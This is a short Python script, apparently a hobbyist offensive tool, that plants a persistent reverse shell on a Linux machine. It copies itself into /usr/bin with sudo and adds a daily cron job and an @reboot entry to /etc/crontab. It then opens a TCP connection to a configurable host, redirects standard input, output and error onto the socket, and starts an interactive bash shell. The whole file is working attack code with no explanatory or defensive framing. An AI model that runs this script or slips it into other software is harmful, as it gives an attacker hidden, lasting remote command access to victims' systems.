#!/usr/bin/env python3

from subprocess import run
import os 

# # # # # # # # # # # # # # # # # # # # # #
#                                         #
#   Author  :   Keyj33k                   #
#   Contact :   nomotikag33n@gmail.com    #
#   Twitter :   @keyjeek                  #
#   Github  :   @keyj33k                  #
#   Insta   :   @keyjeek                  #
#   Version :   1.0.3                     #
#                                         #
# # # # # # # # # # # # # # # # # # # # # # 

def __persistence():
    import time
    os.system('clear')
    file_exist_check = os.path.exists("reverseshell.py")

    if file_exist_check == True:   
        os.system('sudo cp reverseshell.py /usr/bin')
        run(f'sudo chattr -i /usr/bin/reverseshell.py', shell=True)
        run(f'echo "30 18 * * * /usr/bin/reverseshell.py" | crontab -e', shell=True)
        run(f'echo "@reboot /usr/bin/reverseshell.py" | tee -a /etc/crontab', shell=True)
        time.sleep(1.25)
    elif file_exist_check == False:  
        pass
    else:
        return __persistence()

class shell:
    
    def __init__(self, target_address, target_port):
        self.target_address = target_address
        self.target_port = target_port
        
reverse_connection = shell("127.0.0.1", int(5003))

if __name__ == "__main__":
    __persistence()
    from os import dup2
    import socket
    os.system('clear')

    # Change socket.SOCK_STREAM(TCP) to socket.SOCK_DRAM for UDP connection
    socket_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socket_sock.connect((reverse_connection.target_address, reverse_connection.target_port))

    dup2(socket_sock.fileno(),0)
    dup2(socket_sock.fileno(),1)
    dup2(socket_sock.fileno(),2)
    run(["/bin/bash","-i"]) 
